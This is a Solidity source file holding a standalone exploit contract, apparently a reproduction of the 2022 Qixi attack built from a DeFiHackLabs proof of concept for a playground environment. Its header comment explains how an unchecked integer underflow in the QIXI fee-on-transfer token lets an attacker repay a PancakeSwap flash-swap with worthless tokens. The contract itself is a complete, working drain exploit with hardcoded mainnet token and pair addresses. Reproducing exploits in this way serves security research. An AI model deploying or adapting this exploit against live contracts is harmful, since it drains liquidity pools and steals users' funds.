// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-08-Qixi).
//
// The DeFiHackLabs PoC (test/Qixi_exp.sol) runs the attack INLINE in the Foundry
// `Exploit is Test` harness: `testExploit()` calls `Pair.swap(...)` and the
// `pancakeCall` callback that repays the flash-swap with worthless QIXI lives on
// the test itself (`attacker = address(this)`). There is no standalone contract
// to deploy. This file is a faithful, self-contained copy of that inline attack
// (the testExploit body → run(); the pancakeCall callback; minimal inline
// interfaces — no imports so it compiles anywhere), compiled inside the registry
// forge project. Logic and constants are copied verbatim from test/Qixi_exp.sol.
//
// Root cause: the QIXI/WBNB PancakeSwap pair priced its WBNB against the QIXI
// token's *reported balance*. QIXI is a fee-on-transfer "tax token" whose
// `_transfer` (Token.sol:102-143) skims 0.01% to ten pseudo-random addresses via
// `_basicTransfer` (Token.sol:145-150) BEFORE the main debit. `_basicTransfer`
// uses raw (unchecked) arithmetic on Solidity 0.4.25: `balanceOf[sender] -=
// value`. An attacker with a ZERO QIXI balance therefore underflows to
// ~(2^256 - small) on the very first scatter `_basicTransfer`, gaining an
// effectively-infinite QIXI balance for free. The flash-swap drains the pair's
// WBNB up-front; the pancakeCall callback repays by transferring ~1e33 QIXI
// (which the underflow conjured). The pair's constant-product `k` check
// (PancakePair.sol:475) only verifies `balance0Adjusted * balance1Adjusted >=
// reserve0 * reserve1` — it never questions whether the QIXI that showed up has
// any value, only that *enough of it arrived*. So the attacker walks off with
// ~6.895 WBNB (the entire reserve minus a 1e7-wei dust) and repays with free
// junk.
//
// NOTE on faithfulness: the original test relied on the historical attacker
// contract already holding a huge QIXI balance (pre-inflated via the owner's
// `mmm` mint). Here the synthetic exploit starts with 0 QIXI and relies on the
// SAME `_basicTransfer` integer-underflow path (Token.sol:146) — verified in
// output.txt:50, where the exploit's balance slot goes 0 → 0xfff...ceb239... —
// to conjure its repayment balance. Both routes exploit the identical root
// cause: QIXI's supply/balance is attacker-controlled, so the pair's k-check is
// meaningless.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract QixiDrain {
    IERC20 internal constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 internal constant QIXI = IERC20(0x65F11B2de17c4af7A8f70858D6CcB63AAC215697);
    IPancakePair internal constant Pair = IPancakePair(0x88fF4f62A75733C0f5afe58672121568a680DE84);

    function run() external {
        // Mirror testExploit(): take ~all the pair's WBNB out via a flash-swap,
        // leaving only 1e7 wei of dust. pancakeCall() repays in free QIXI.
        Pair.swap(0, WBNB.balanceOf(address(Pair)) - 1e7, address(this), bytes("0x123"));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // Repay the flash-swap by transferring a vast amount of QIXI to the pair.
        // The exploit's QIXI balance started at 0; QIXI._transfer's fee-scatter
        // loop calls _basicTransfer (unchecked 0.4.25 arithmetic) ten times before
        // the main debit, underflowing this contract's balance to ~(2^256 - tiny).
        // The pair is credited (value - 2% burn) ≈ 9.8e32 QIXI — five orders of
        // magnitude above what the k-check needs (646.62 QIXI reserve). Swap OK.
        QIXI.transfer(address(Pair), 999_999_999_999_999e18);
    }
}
